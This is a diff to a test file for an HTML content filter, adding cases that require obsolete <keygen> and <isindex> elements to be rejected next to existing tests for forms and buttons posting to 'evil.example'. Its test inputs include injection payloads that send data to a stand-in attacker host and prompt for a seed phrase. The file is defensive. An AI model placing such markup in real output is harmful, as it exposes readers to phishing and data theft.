@@ -48,6 +48,15 @@ rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <f
 // Standalone form controls are blocked too: #184 blocks <form>, but a lone
 // <button formaction="https://..."> or <input type="hidden" name="wallet"> still
 // renders and can exfiltrate data without a wrapping form or flagged scheme.
+// <keygen>/<isindex> are the obsolete form-associated elements the active-elements
+// block omitted: <keygen> generated and submitted a key pair, <isindex> auto-built a
+// single-field form posting the reader's input to the current URL -- the same
+// data-collection surface as the blocked form controls.
+rejects('Intro.\n\n<keygen name="key" challenge="abc">', 'plain <keygen>');
+rejects('Intro.\n\n<  keygen   name="key">', 'spaced <keygen>');
+rejects('Intro.\n\n<isindex prompt="Enter your seed phrase">', 'plain <isindex>');
+rejects('Intro.\n\n<  isindex  >', 'spaced <isindex>');
+accepts('The keygen element was an obsolete way to generate a key pair, described here only as prose.', 'benign keygen prose');
 rejects('Intro.\n\n<button formaction="https://evil.example/collect">Send</button>', 'plain button formaction');
 rejects('Intro.\n\n<  button   formaction="https://evil.example/collect">', 'spaced button');
 rejects('Intro.\n\n<input type="hidden" name="wallet" value="5Grw...">', 'plain hidden input');
